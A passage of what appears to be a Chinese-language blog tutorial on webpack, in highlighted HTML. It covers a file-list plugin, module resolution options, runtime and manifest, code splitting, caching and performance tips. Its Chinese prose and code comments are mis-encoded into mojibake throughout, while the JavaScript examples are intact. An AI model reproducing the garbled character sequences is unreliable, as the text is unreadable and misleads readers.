class="hljs-string">&#x27;./webpack.config.js&#x27;</span>)<br><br><span class="hljs-keyword">let</span> compiler = <span class="hljs-title function_">webpack</span>(configuration)<br><br><span class="hljs-keyword">new</span> webpack.<span class="hljs-title class_">ProgressPlugin</span>().<span class="hljs-title function_">apply</span>(compiler)<br><br>compiler.<span class="hljs-title function_">run</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">err, stats</span>) &#123;<br>  <span class="hljs-comment">// ...</span><br>&#125;)<br></code></pre></td></tr></table></figure><h3 id="ç¼–å†™ä¸€ä¸ªplugin"><a href="#ç¼–å†™ä¸€ä¸ªplugin" class="headerlink" title="ç¼–å†™ä¸€ä¸ªplugin"></a>ç¼–å†™ä¸€ä¸ªplugin</h3><p>ä¸€ä¸ªç”Ÿæˆæ„å»ºæ–‡ä»¶æ¸…å•çš„æ’ä»¶ï¼š</p><p><strong>fileListPlugin.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">FileListPlugin</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(&#123;<br>      <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>      <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>    &#125;, options)<br>  &#125;<br>  <br>  <span class="hljs-title function_">apply</span>(<span class="hljs-params">compiler</span>) &#123;<br>    <span class="hljs-keyword">const</span> &#123; filename, title &#125; = <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span><br>    <br>    compiler.<span class="hljs-property">hooks</span>.<span class="hljs-property">emit</span>.<span class="hljs-title function_">tapAsync</span>(<span class="hljs-string">&#x27;FileListPlugin&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">compilation, callback</span>) &#123;<br>      <span class="hljs-comment">// åˆ›å»ºæ–‡ä»¶å†…å®¹</span><br>      <span class="hljs-keyword">let</span> fileList = title<br>      <br>      <span class="hljs-comment">// éå†æ‰€æœ‰ç¼–è¯‘èµ„æº</span><br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> asset <span class="hljs-keyword">in</span> compilation.<span class="hljs-property">assets</span>) &#123;<br>        <span class="hljs-keyword">const</span> size = compilation.<span class="hljs-property">assets</span>[asset].<span class="hljs-title function_">size</span>()<br>        fileList += <span class="hljs-string">`- <span class="hljs-subst">$&#123;asset&#125;</span> (<span class="hljs-subst">$&#123;size&#125;</span> bytes)\n`</span><br>      &#125;<br>      <br>      <span class="hljs-comment">// å°†æ¸…å•ä½œä¸ºæ–°èµ„æºæ·»åŠ åˆ°ç¼–è¯‘ä¸­</span><br>      compilation.<span class="hljs-property">assets</span>[filename] = &#123;<br>        <span class="hljs-attr">source</span>: <span class="hljs-function">() =&gt;</span> fileList,<br>        <span class="hljs-attr">size</span>: <span class="hljs-function">() =&gt;</span> fileList.<span class="hljs-property">length</span><br>      &#125;<br>      <br>      <span class="hljs-title function_">callback</span>()<br>    &#125;)<br>  &#125;<br>&#125;<br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title class_">FileListPlugin</span><br></code></pre></td></tr></table></figure><h2 id="æ¨¡å—è§£æ"><a href="#æ¨¡å—è§£æ" class="headerlink" title="æ¨¡å—è§£æ"></a>æ¨¡å—è§£æ</h2><p>webpack ä½¿ç”¨ enhanced-resolve æ¥è§£ææ–‡ä»¶è·¯å¾„ï¼Œæ”¯æŒä¸‰ç§æ–‡ä»¶è·¯å¾„çš„è§£æï¼š</p><ul><li>ç›¸å¯¹è·¯å¾„ï¼š<code>import &#39;../src/file1&#39;</code></li><li>ç»å¯¹è·¯å¾„ï¼š<code>import &#39;/home/me/file&#39;</code></li><li>æ¨¡å—è·¯å¾„ï¼š<code>import &#39;module/lib/file&#39;</code></li></ul><h3 id="è§£æè§„åˆ™"><a href="#è§£æè§„åˆ™" class="headerlink" title="è§£æè§„åˆ™"></a>è§£æè§„åˆ™</h3><p>å½“æ–‡ä»¶è·¯å¾„ç±»å‹ä¸ºæ¨¡å—è·¯å¾„æ—¶ï¼Œè·¯å¾„è§£æéµå¾ªä»¥ä¸‹è§„åˆ™ï¼š</p><ul><li>åŸºäºwebpack.config.jsä¸­é…ç½®çš„resolve.modulesä¸­æŒ‡å®šçš„ç›®å½•ï¼ˆé»˜è®¤æ˜¯<code>[&#39;node_modules&#39;]</code>ï¼‰è¿›è¡Œæ£€ç´¢ï¼Œå¦‚æœæ·»åŠ ä¸€ä¸ªç›®å½•åˆ°æ¨¡å—æœç´¢ç›®å½•ï¼Œæ­¤ç›®å½•ä¼˜å…ˆäº node_modules&#x2F; æœç´¢</li></ul><p><strong>webpack.config.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>)<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-comment">//...</span><br>  <span class="hljs-attr">resolve</span>: &#123;<br>    <span class="hljs-attr">modules</span>: [path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;src&#x27;</span>), <span class="hljs-string">&#x27;node_modules&#x27;</span>],<br>  &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>src&#x2F;index.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å°†ä¼˜å…ˆä»srcç›®å½•ä¸‹å¼€å§‹æ£€ç´¢</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Tabs</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;antd&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>å¦‚æœæ¨¡å—ï¼ˆpackageï¼‰ä¸­æœ‰package.jsonæ–‡ä»¶ï¼Œåˆ™åœ¨resolve.exportsFieldsé…ç½®é¡¹ä¸­æŒ‡å®šçš„å­—æ®µä¼šè¢«ä¾æ¬¡æŸ¥æ‰¾ï¼Œä¼˜å…ˆçº§é«˜äºpackage.jsonä¸­çš„main&#x2F;moduleå­—æ®µ</li></ul><p><strong>webpack.config.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-comment">//...</span><br>  <span class="hljs-attr">resolve</span>: &#123;<br>    <span class="hljs-attr">exportsFields</span>: [<span class="hljs-string">&#x27;exports&#x27;</span>, <span class="hljs-string">&#x27;myCompanyExports&#x27;</span>],<br>  &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>myPkgä¸­çš„package.json</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;myPkg&#x27;</span>,<br>  <span class="hljs-attr">scripts</span>: &#123;&#125;,<br>  <span class="hljs-attr">exports</span>: &#123;<br>    <span class="hljs-string">&#x27;.&#x27;</span>: &#123;<br>      <span class="hljs-string">&quot;require&quot;</span>: <span class="hljs-string">&quot;./index.cjs&quot;</span>,<br>      <span class="hljs-string">&quot;import&quot;</span>: <span class="hljs-string">&quot;./index.mjs&quot;</span>,<br>    &#125;,<br>  &#125;,<br>  <span class="hljs-attr">myCompanyExports</span>: &#123;<br>    <span class="hljs-string">&#x27;.&#x27;</span>: &#123;<br>      <span class="hljs-string">&quot;require&quot;</span>: <span class="hljs-string">&quot;./index.cjs&quot;</span>,<br>      <span class="hljs-string">&quot;import&quot;</span>: <span class="hljs-string">&quot;./index.mjs&quot;</span>,<br>    &#125;,<br>  &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>src&#x2F;index.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ESæ¨¡å—å¯¼å…¥</span><br><span class="hljs-keyword">import</span> myPkg <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;myPkg&#x27;</span><br><span class="hljs-comment">// CommonJSæ¨¡å—å¯¼å…¥</span><br><span class="hljs-keyword">const</span> myPkg = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;myPkg&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ä¸€æ—¦æ ¹æ®ä¸Šè¿°è§„åˆ™è§£æè·¯å¾„åï¼Œenhanced-resolve å°†ä¼šæ£€æŸ¥è·¯å¾„æ˜¯æŒ‡å‘æ–‡ä»¶è¿˜æ˜¯æ–‡ä»¶å¤¹ã€‚</p><p>å¦‚æœè·¯å¾„æŒ‡å‘æ–‡ä»¶ï¼š</p><ul><li>å¦‚æœæ–‡ä»¶å…·æœ‰æ‰©å±•åï¼Œåˆ™ç›´æ¥å°†æ–‡ä»¶æ‰“åŒ…</li><li>å¦åˆ™ï¼Œå°†ä½¿ç”¨ resolve.extensions é€‰é¡¹ä½œä¸ºæ–‡ä»¶æ‰©å±•åæ¥è§£æï¼Œæ­¤é€‰é¡¹ä¼šå‘Šè¯‰è§£æå™¨åœ¨è§£æä¸­èƒ½å¤Ÿæ¥å—é‚£äº›æ‰©å±•åï¼ˆä¾‹å¦‚ .jsï¼Œ.jsxï¼‰</li></ul><p>å¦‚æœè·¯å¾„æŒ‡å‘ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œåˆ™è¿›è¡Œå¦‚ä¸‹æ­¥éª¤å¯»æ‰¾å…·æœ‰æ­£ç¡®æ‰©å±•åçš„æ–‡ä»¶ï¼š</p><ul><li>å¦‚æœæ–‡ä»¶å¤¹ä¸­åŒ…å« package.json æ–‡ä»¶ï¼Œåˆ™ä¼šæ ¹æ® resolve.mainFields é…ç½®ä¸­çš„å­—æ®µé¡ºåºæŸ¥æ‰¾ï¼Œå¹¶æ ¹æ® package.json ä¸­çš„ç¬¦åˆé…ç½®è¦æ±‚çš„ç¬¬ä¸€ä¸ªå­—æ®µæ¥ç¡®å®šæ–‡ä»¶è·¯å¾„ã€‚</li></ul><p><strong>webpack.config.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-comment">//...</span><br>  <span class="hljs-attr">resolve</span>: &#123;<br>    <span class="hljs-attr">mainFields</span>: [<span class="hljs-string">&#x27;browser&#x27;</span>, <span class="hljs-string">&#x27;module&#x27;</span>, <span class="hljs-string">&#x27;main&#x27;</span>],<br>  &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>myPkgä¸­çš„package.json</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&#123;<br>  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&#x27;myPkg&#x27;</span>,<br>  <span class="hljs-string">&quot;browser&quot;</span>: <span class="hljs-string">&quot;build/myPkg.js&quot;</span>,<br>  <span class="hljs-string">&quot;module&quot;</span>: <span class="hljs-string">&quot;index&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>src&#x2F;index.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä»build/myPkg.jsä¸­æŸ¥æ‰¾</span><br><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> myPkg <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;myPkg&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>å¦‚æœä¸å­˜åœ¨ package.json æ–‡ä»¶æˆ– resolve.mainFields æ²¡æœ‰è¿”å›æœ‰æ•ˆè·¯å¾„ï¼Œåˆ™ä¼šæ ¹æ® resolve.mainFiles é…ç½®é€‰é¡¹ä¸­æŒ‡å®šçš„æ–‡ä»¶åé¡ºåºæŸ¥æ‰¾ï¼Œçœ‹æ˜¯å¦èƒ½åœ¨ import&#x2F;require çš„ç›®å½•ä¸‹åŒ¹é…åˆ°ä¸€ä¸ªå­˜åœ¨çš„æ–‡ä»¶å</li><li>ç„¶åä½¿ç”¨ resolve.extensions é€‰é¡¹ï¼Œä»¥ç±»ä¼¼çš„æ–¹å¼è§£ææ–‡ä»¶æ‰©å±•å</li></ul><h2 id="runtimeå’Œmainfest"><a href="#runtimeå’Œmainfest" class="headerlink" title="runtimeå’Œmainfest"></a>runtimeå’Œmainfest</h2><p>åœ¨ä½¿ç”¨ webpack æ„å»ºçš„å…¸å‹åº”ç”¨ç¨‹åºæˆ–ç«™ç‚¹ä¸­ï¼Œæœ‰ä¸‰ç§ä¸»è¦çš„ä»£ç ç±»å‹ï¼š</p><ul><li>ä½ æˆ–ä½ çš„å›¢é˜Ÿç¼–å†™çš„æºç ã€‚</li><li>ä½ çš„æºç ä¼šä¾èµ–çš„ä»»ä½•ç¬¬ä¸‰æ–¹çš„ library æˆ– â€œvendorâ€ ä»£ç ã€‚</li><li>webpack çš„ runtime å’Œ manifestï¼Œç®¡ç†æ‰€æœ‰æ¨¡å—çš„äº¤äº’ã€‚</li></ul><h3 id="runtime"><a href="#runtime" class="headerlink" title="runtime"></a>runtime</h3><p>ä¸»è¦æŒ‡åœ¨æµè§ˆå™¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œwebpackç”¨æ¥è¿æ¥å„ä¸ªæ¨¡å—åŒ–ä»£ç çš„ä»£ç ï¼Œruntimeä»£ç ä½¿æ¨¡å—åŒ–ä»£ç èƒ½åŠ è½½å’Œè§£æå…¶ä»–çš„æ¨¡å—åŒ–ä»£ç ï¼Œä»è€Œä¸å…¶ä»–æ¨¡å—åŒ–ä»£ç äº¤äº’ã€‚å¯ä»¥ä½¿ç”¨ <code>optimization.runtimeChunk: &#39;single&#39;</code> é€‰é¡¹å°† runtime ä»£ç æ‹†åˆ†ä¸ºä¸€ä¸ªå•ç‹¬çš„ chunkã€‚</p><h3 id="mainfest"><a href="#mainfest" class="headerlink" title="mainfest"></a>mainfest</h3><p>mainfestæ˜¯ä¸€å¼ æ˜ å°„è¡¨ï¼Œè®°å½•äº†æ¨¡å—æ‰“åŒ…åçš„å…³é”®å…ƒæ•°æ®ï¼Œç”¨æ¥åœ¨è¿è¡Œæ—¶ç®¡ç†æ¨¡å—çš„åŠ è½½å’Œä¾èµ–å…³ç³»ã€‚ç†è§£ Manifest æ˜¯æŒæ¡ Webpack è¿è¡Œæœºåˆ¶çš„å…³é”®ï¼Œå°¤å…¶åœ¨ <strong>ä»£ç åˆ†å‰²</strong> å’Œ <strong>ç¼“å­˜ç­–ç•¥</strong> ä¼˜åŒ–ä¸­è‡³å…³é‡è¦ï¼</p><p>mainfestçš„ä¸»è¦ä½œç”¨æœ‰ä»¥ä¸‹ä¸‰ç‚¹ï¼š</p><ul><li>æ¨¡å—æ ‡è¯†ï¼šå°†æ‰“åŒ…å‰çš„æ¨¡å—è·¯å¾„æ˜ å°„ä¸ºæ‰“åŒ…åçš„æ¨¡å—ID</li><li>åŠ¨æ€åŠ è½½ï¼šç®¡ç†å¼‚æ­¥åŠ è½½çš„æ¨¡å—ï¼ˆå¦‚import()æ‹†åˆ†çš„ä»£ç å—ï¼‰</li><li>ç¼“å­˜ä¼˜åŒ–ï¼šé€šè¿‡å†…å®¹å“ˆå¸Œå®ç°æŒä¹…ç¼“å­˜</li></ul><p>å…¸å‹çš„mainfestå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&#123;<br>  <span class="hljs-string">&quot;modules&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;./src/index.js&quot;</span>: <span class="hljs-number">0</span>,          <span class="hljs-comment">// æ¨¡å—è·¯å¾„ â†’ æ¨¡å—ID</span><br>    <span class="hljs-string">&quot;./src/utils.js&quot;</span>: <span class="hljs-number">1</span><br>  &#125;,<br>  <span class="hljs-string">&quot;chunks&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;main&quot;</span>: &#123;                     <span class="hljs-comment">// å…¥å£ä»£ç å—</span><br>      <span class="hljs-string">&quot;js&quot;</span>: <span class="hljs-string">&quot;main.abc123.js&quot;</span>,     <span class="hljs-comment">// ç”Ÿæˆçš„æ–‡ä»¶å</span><br>      <span class="hljs-string">&quot;contains&quot;</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]          <span class="hljs-comment">// åŒ…å«çš„æ¨¡å—ID</span><br>    &#125;,<br>    <span class="hljs-string">&quot;async-chunk&quot;</span>: &#123;              <span class="hljs-comment">// å¼‚æ­¥ä»£ç å—</span><br>      <span class="hljs-string">&quot;js&quot;</span>: <span class="hljs-string">&quot;async.def456.js&quot;</span>,<br>      <span class="hljs-string">&quot;loaded&quot;</span>: <span class="hljs-literal">false</span>             <span class="hljs-comment">// æ ‡è®°æ˜¯å¦å·²åŠ è½½</span><br>    &#125;<br>  &#125;,<br>  <span class="hljs-string">&quot;runtime&quot;</span>: <span class="hljs-string">&quot;runtime.xyz789.js&quot;</span>  <span class="hljs-comment">// Webpack è¿è¡Œæ—¶ä»£ç </span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ä»£ç åˆ†ç¦»"><a href="#ä»£ç åˆ†ç¦»" class="headerlink" title="ä»£ç åˆ†ç¦»"></a>ä»£ç åˆ†ç¦»</h2><p>ä»£ç åˆ†ç¦»æ˜¯webpackæ¯”è¾ƒé‡è¦çš„ç‰¹æ€§ï¼Œå®ƒèƒ½å¤Ÿå°†ä»£ç åˆ†ç¦»åˆ°ä¸åŒçš„bundleï¼Œç„¶åæŒ‰éœ€åŠ è½½æˆ–å¹¶è¡ŒåŠ è½½ï¼Œæ§åˆ¶èµ„æºåŠ è½½çš„ä¼˜å…ˆçº§ï¼Œæå‡é¡µé¢åŠ è½½é€Ÿåº¦ï¼Œå¸¸è§çš„ä»£ç åˆ†ç¦»æ–¹å¼æœ‰ä¸‰ç§ï¼š</p><ul><li>å…¥å£åˆ†ç¦»ï¼šé€šè¿‡entryé…ç½®å°†ä¸‰æ–¹åº“ï¼ˆå¦‚reactã€antdç­‰ï¼‰é…ç½®æˆå•ç‹¬çš„entryï¼Œå®ç°vendoråˆ†ç¦»</li><li>é˜²æ­¢é‡å¤ï¼šä½¿ç”¨å…¥å£ä¾èµ–ï¼ˆentry dependOnï¼‰æˆ–splitChunksPluginå»é‡å’Œåˆ†ç¦»chunk</li><li>åŠ¨æ€å¯¼å…¥ï¼šå°†é¡¶éƒ¨çš„<code>import _ from lodash</code>æ”¹ä¸ºåœ¨å®é™…éœ€è¦lodashçš„åœ°æ–¹å¼•å…¥<code>import(lodash).then((&#123; default: _ &#125;) =&gt; &#123;&#125;)</code></li></ul><p>Webpack v4.6.0+ å¢åŠ äº†å¯¹é¢„è·å–å’Œé¢„åŠ è½½çš„æ”¯æŒ:</p><ul><li>é¢„è·å–ï¼š<code>import(/* webpackPrefetch: true */ &#39;./path/to/LoginModal.js&#39;)</code></li><li>é¢„åŠ è½½ï¼š<code>import(/* webpackPreload: true */ &#39;ChartingLibrary&#39;)</code></li></ul><p>å¯ä»¥ä½¿ç”¨webpackå®˜æ–¹åˆ†æå·¥å…·æˆ–è€…å…¶ä»–ä¸‰æ–¹å·¥å…·ï¼ˆwebpack-bundle-analyzerã€webpack-visualizerç­‰ï¼‰åˆ†æåˆ†ç¦»åçš„bundleï¼Œè¿›ä¸€æ­¥ä¼˜åŒ–ä»£ç </p><h2 id="ç¼“å­˜-æ€§èƒ½ä¼˜åŒ–"><a href="#ç¼“å­˜-æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="ç¼“å­˜&#x2F;æ€§èƒ½ä¼˜åŒ–"></a>ç¼“å­˜&#x2F;æ€§èƒ½ä¼˜åŒ–</h2><h3 id="ç¼“å­˜"><a href="#ç¼“å­˜" class="headerlink" title="ç¼“å­˜"></a>ç¼“å­˜</h3><ul><li>åŸºäºæµè§ˆå™¨ç¼“å­˜è§„åˆ™ï¼Œå¯¹output.filenameä½¿ç”¨contenthashå¯ä½¿æ–‡ä»¶åæ ¹æ®æ–‡ä»¶å†…å®¹å˜åŒ–è€Œå˜åŒ–</li><li>ä½¿ç”¨ <code>optimization.runtimeChunk: &#39;single&#39;</code> é€‰é¡¹å°† runtime ä»£ç æ‹†åˆ†ä¸ºä¸€ä¸ªå•ç‹¬çš„ chunk</li><li>ä½¿ç”¨ <strong>splitChunksPlugin</strong>æ’ä»¶çš„cacheGroupé€‰é¡¹æ¥ç¼“å­˜å¾ˆå°‘ä¿®æ”¹çš„ä¸‰æ–¹åº“</li><li>é€šè¿‡æ¨¡å—æ ‡è¯†ç¬¦ï¼ˆ<code>optimization.moduleIds: &#39;deterministic&#39;</code>ï¼‰ä¿è¯å¤šæ¬¡æ„å»ºåä¸‰æ–¹vendorçš„æ–‡ä»¶åhashå€¼ä¸å˜</li></ul><h3 id="æ€§èƒ½ä¼˜åŒ–"><a href="#æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="æ€§èƒ½ä¼˜åŒ–"></a>æ€§èƒ½ä¼˜åŒ–</h3><ul><li>ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬çš„webpackã€nodeã€npm</li><li>ç²¾å‡†ä½¿ç”¨loaderï¼Œé€šè¿‡include&#x2F;excludeæ’æŸ¥ä¸éœ€è¦è½¬æ¢çš„èµ„æº</li><li>å°½å¯èƒ½å°‘ä½¿ç”¨loader&#x2F;pluginï¼Œå®ƒä»¬ä¼šé¢å¤–çš„æ¶ˆè€—æ€§èƒ½</li><li>ç²¾ç¡®çš„åŒ¹é…æ–‡ä»¶èµ„æºï¼Œå‡å°‘èµ„æºè§£æçš„æ—¶é—´ï¼Œå‡å°‘resolve.modules, resolve.extensions, resolve.mainFiles, resolve.descriptionFiles ä¸­æ¡ç›®æ•°é‡ï¼Œå› ä¸ºä»–ä»¬ä¼šå¢åŠ æ–‡ä»¶ç³»ç»Ÿè°ƒç”¨çš„æ¬¡æ•°ï¼š<code>import &#39;./src/demo&#39;</code>æ”¹ä¸º<code>import &#39;./src/demo.js&#39;</code>ï¼Œresolve.extensions: [â€˜.jsâ€™, â€˜.jsxâ€™]</li><li>ä½¿ç”¨Dllpluginä¸ºæ›´æ”¹ä¸é¢‘ç¹çš„ä»£ç å•ç‹¬ç¼–è¯‘</li><li>ä½¿ç”¨æ›´å°‘&#x2F;æ›´å°çš„ä¸‰æ–¹åº“ï¼Œåˆ é™¤æœªä½¿ç”¨çš„ä»£ç ï¼Œæ›´åˆç†çš„åˆ†ç¦»chunkï¼Œå‡å°‘å¤§ä½“ç§¯èµ„æºçš„ç”Ÿæˆ</li><li>ä½¿ç”¨thread-loaderå°†è€—èµ„æºçš„loaderäº¤ç»™workeræ± </li><li>ä½¿ç”¨webpackçš„cacheå¹¶é…åˆpackage.jsonä¸­çš„postinstallæ¸…é™¤ç¼“å­˜ç›®å½•å®ç°æŒä¹…åŒ–ç¼“å­˜</li><li>ç§»é™¤webpack ProgressPluginï¼Œè¯¥æ’ä»¶æ²¡å¤šå¤§å®é™…ç”¨é€”ï¼Œä¸”è€—è´¹èµ„æº</li><li>åˆ†ç¯å¢ƒä½¿ç”¨loader&#x2F;pluginï¼Œä¸è¦ç´§ç”Ÿäº§ç¯å¢ƒã€å¼€å‘ç¯å¢ƒçš„loaderã€pluginæ··ç”¨</li><li>ä½¿ç”¨webpackå‹ç¼©å·¥å…·å‹ç¼©ç”Ÿäº§ç¯å¢ƒä»£ç </li><li>source-mapéå¸¸æ¶ˆè€—èµ„æºï¼Œç”Ÿäº§ç¯å¢ƒåº”ç¦ç”¨</li><li>åˆç†çš„ä½¿ç”¨webpackä¸‰æ–¹å·¥å…·ï¼ˆbabelã€typescriptã€sassç­‰ï¼‰</li><li>webpack5.xæ”¯æŒæ¨¡å—è”é‚¦ï¼Œå¯ä»¥åœ¨å¾®å‰ç«¯æ¶æ„ä¸­æå–å…¬å…±æ¨¡å—</li><li>åˆç†ä½¿ç”¨tree shakingï¼šé€šè¿‡webpackçš„optimization.usedExports: trueé…åˆpackage.jsonçš„sideEffects: falseå°†æ–‡æœ¬æ ‡è®°ä¸ºæ— å‰¯ä½œç”¨ã€‚tree shakingåªé€‚ç”¨äºES2015ä»¥ä¸Šçš„import&#x2F;exportè¯­æ³•</li><li>çœŸæ­£æ„ä¹‰ä¸Šçš„æ‡’åŠ è½½ï¼šæ¯”å¦‚button clickäº‹ä»¶è§¦å‘æ—¶å†åŠ¨æ€import lodash</li></ul><h2 id="å…¼å®¹æ€§"><a href="#å…¼å®¹æ€§" class="headerlink" title="å…¼å®¹æ€§"></a>å…¼å®¹æ€§</h2><p>webpackè¿è¡Œç¯å¢ƒå’Œwebpackæ„å»ºå‡ºæ¥çš„é¡¹ç›®çš„è¿è¡Œç¯å¢ƒä¸æ˜¯ä¸€ä¸ªæ¦‚å¿µï¼ŒwebpackåŸºäºNode.jsè¿è¡Œï¼Œwebpackæ„å»ºå‡ºæ¥çš„é¡¹ç›®ä¸€èˆ¬åŸºäºæµè§ˆå™¨ç¯å¢ƒè¿è¡Œ</p><h3 id="æµè§ˆå™¨å…¼å®¹æ€§"><a href="#æµè§ˆå™¨å…¼å®¹æ€§" class="headerlink" title="æµè§ˆå™¨å…¼å®¹æ€§"></a>æµè§ˆå™¨å…¼å®¹æ€§</h3><p>webpackæ”¯æŒæ‰€æœ‰ç¬¦åˆES5æ ‡å‡†çš„æµè§ˆå™¨ï¼ˆä¸æ”¯æŒIE8åŠä»¥ä¸‹ç‰ˆæœ¬ï¼‰ï¼Œå¦‚æœæƒ³å…¼å®¹æ—§ç‰ˆæœ¬æµè§ˆå™¨ï¼Œéœ€è¦åŠ è½½polyfillï¼š</p><p><strong>src&#x2F;index.js</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;babel-polyfill&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Component</span>(<span class="hljs-params"></span>) &#123;&#125;<br></code></pre></td></tr></table></figure><h3 id="é…ç½®å…¼å®¹æ€§"><a href="#é…ç½®å…¼å®¹æ€§" class="headerlink" title="é…ç½®å…¼å®¹æ€§"></a>é…ç½®å…¼å®¹æ€§</h3><p>webpack.config.jsé…ç½®æ–‡ä»¶æ˜¯webpackè¿è¡Œè¿‡ç¨‹ä¸­æœ¬èº«éœ€è¦çš„æ–‡ä»¶ï¼Œåº”é¿å…ES6è¯­æ³•ç¼–å†™ä»£ç ï¼š</p><ul><li>webpackåŸºäºNode.jsè¿è¡Œï¼Œéµå¾ªCommonJSè§„èŒƒ</li><li>Node.js 